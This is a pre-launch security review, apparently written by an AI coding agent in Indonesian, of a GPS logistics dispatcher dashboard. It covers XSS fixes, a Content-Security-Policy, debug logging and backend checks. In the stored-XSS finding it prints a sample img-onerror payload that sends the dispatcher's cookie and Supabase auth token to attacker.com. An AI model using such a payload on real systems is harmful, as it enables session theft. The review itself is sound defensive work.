# Security Review — GPS Dashboard (sebelum go-live)

## 🔴 KRITIS — sudah diperbaiki

**Stored XSS di `active.js`, `absen.js`, `instruksi.js`.**

Ketiga file nyusun HTML lewat template literal (`item.driver`, `item.vendor`,
`item.sjkb`, `item.dest`, `item.status`, `id`) terus di-suntik ke DOM pakai
`innerHTML`/`outerHTML` **tanpa di-escape**. `driver` & `vendor` asalnya dari
input bebas pas registrasi driver (nama lengkap, nama ekspedisi) — artinya
akun driver mana pun (level akses paling rendah di sistem ini) bisa naruh
payload kayak:

```
<img src=x onerror="fetch('https://attacker.com/steal?c='+document.cookie+location.origin+localStorage.getItem('sb-xxx-auth-token'))">
```

sebagai nama lengkapnya. Begitu data itu muncul di dashboard dispatcher
(popup peta / tabel active / absen / instruksi), payload itu **langsung
eksekusi di browser dispatcher** — bisa dipakai buat curi session token
dispatcher dari localStorage, atau kirim instruksi palsu ke driver lain
pakai identitas dispatcher yang kena.

**Fix:** nambahin `sanitize.js` (helper `escapeHtml()`) dan diterapkan ke
SEMUA field dinamis di ketiga file itu (termasuk popup peta di `buildPopup`
`active.js`). Lookup `data-id` di `querySelector` juga dikerasin pakai
`CSS.escape()`.

## 🟠 SEDANG — sudah ditambahkan (defense-in-depth)

**Content-Security-Policy** ditambahin di `index.html` — `script-src`
TANPA `'unsafe-inline'`, jadi walaupun ada celah XSS lain yang kelewat
(atau muncul dari perubahan kode di masa depan), payload semacam
`onerror="..."` gak akan bisa eksekusi.

Konsekuensinya: semua `onclick="..."` inline di `index.html` (6 tempat)
DIHAPUS dan dipindah ke `addEventListener` di `index.js`, karena CSP yang
ketat juga ngeblok inline event handler. Sekalian ketauan **tombol login
manual gak pernah ke-wire** (`type="submit"` tanpa listener submit sama
sekali → klik-nya cuma native form submit yang reload halaman kosong) —
ini dibenerin juga karena nyambung langsung sama perubahan ini.

⚠️ **CSP ini belum sempat dites di browser beneran** (sandbox ini gak ada
akses buat nge-run dev server/browser). Domain yang diizinin disusun dari
semua resource eksternal yang kepake di kode (Google Sign-In, Google
Fonts, Font Awesome cdnjs, tile OpenStreetMap, API Vercel, WS bridge,
Supabase). **Tolong test semua alur (login Google, peta, font, form
kirim instruksi) sebelum production** — kalau ada yang keblokir, buka
DevTools Console, browser bakal nunjukin domain mana yang perlu
ditambahin ke directive CSP yang mana.

## 🟡 RINGAN — sudah diperbaiki

`console.log` yang nyebar di 7 file (nge-log idseason, status, driver id,
raw WS payload, dst) sekarang lewat helper `dlog()` (`debug.js`) yang cuma
aktif pas `vite dev`, otomatis no-op di hasil `vite build` production.
Jadi siapa pun yang buka DevTools di komputer dispatcher (apalagi kalau
komputernya dipakai bareng-bareng) gak lihat data operasional mentah.
`console.error`/`console.warn` sengaja TIDAK disentuh (tetep perlu ada
buat debugging production).

## ⚪ INFORMATIONAL — perlu kamu verifikasi sendiri (di luar jangkauan kode frontend)

Ini semua hal yang **gak bisa gw cek dari kode frontend doang** — perlu
diverifikasi di sisi Supabase project / backend Vercel:

1. **Row Level Security (RLS).** `VITE_SUPABASE_ANON_KEY` itu memang
   didesain publik (nempel di bundle JS siapa aja bisa lihat) — yang
   nge-batasin akses adalah RLS policy di tabel Supabase (`users`, `Plan`,
   `path_history`, `rute_logistik`, dst). Kalau RLS belum diaktifin atau
   ada tabel yang policy-nya kebuka lebar, siapa aja yang punya anon key
   (artinya semua orang) bisa baca/tulis langsung ke database lewat
   PostgREST, LEPAS dari validasi apapun di kode JS ini. **Ini kemungkinan
   besar hal PALING PENTING buat dicek sebelum go-live**, dan gw gak
   punya visibility ke situ.
2. **Otorisasi di endpoint `git-nday.vercel.app`.** `/api/send-instruction`,
   `/api/request-data`, `/api/keys`, dst validasi JWT-nya (Bearer token),
   tapi pastiin backend JUGA ngecek ROLE/permission-nya — misal jangan
   sampai akun driver biasa bisa manggil `/api/send-instruction` buat
   ngirim instruksi ke driver lain, cuma karena dia punya token yang valid.
3. **Token WebSocket lewat query string** (`wss://.../ws?token=...`) di
   `websocket.js` — pola umum karena WebSocket browser API emang gak bisa
   custom header, tapi tokennya bisa kesangkut di access log server/proxy
   kalau logging-nya gak di-strip query string. Pastiin `ws-bridge`
   worker-nya gak nge-log full URL request ke tempat manapun.
4. **AES key (`aes.js`/`secret.key`)** cuma nyamarin data yang di-cache di
   IndexedDB lokal (`logistic_db`) dari orang yang oprek-oprek DevTools >
   Application > IndexedDB secara kasual — bukan boundary keamanan
   beneran, karena key-nya sendiri diambil dari `/api/keys` pakai token
   yang sama yang dipunya user itu juga. Ini desain yang udah ada, cuma
   mau dipastiin ekspektasinya jelas: ini "obfuscation", bukan enkripsi
   end-to-end.

## Yang TIDAK diubah (dicek, aman)

- `submit.js` pakai `el.textContent = text` (bukan innerHTML) buat pesan
  form — aman.
- `auth.js`: satu-satunya `innerHTML` yang isinya dinamis (`msg.innerHTML
  = message`) semua call site-nya pakai string hardcode, gak ada yang dari
  data user.
- `sw.js` (service worker) cuma cache asset same-origin, gak cache respons
  API — aman dari cache poisoning.
- Gak ada `eval()`, `new Function()`, `document.write()`, atau
  `insertAdjacentHTML` di manapun.
- Gak ada file `.env`/secret yang ketinggalan ke-zip.
